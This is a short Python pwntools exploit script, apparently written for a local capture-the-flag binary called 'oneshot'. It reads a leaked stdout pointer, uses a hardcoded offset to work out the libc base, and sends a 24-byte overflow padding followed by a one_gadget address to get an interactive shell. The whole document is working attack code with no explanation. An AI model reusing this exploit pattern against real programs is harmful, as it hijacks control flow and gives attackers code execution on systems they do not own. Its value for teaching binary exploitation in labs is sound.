# oneshot_test.py
from pwn import *
p = process("./oneshot")
print p.recvuntil("stdout: ")
stdout = p.recvuntil("\n").strip("\n")      
stdout = int(stdout, 16)       
print "stdout: " + hex(stdout)

libc_base = stdout - 0x3c5620
oneshot_gadget = libc_base + 0x45216

payload = "A"*24 + p64(oneshot_gadget)
p.send(payload)



p.interactive()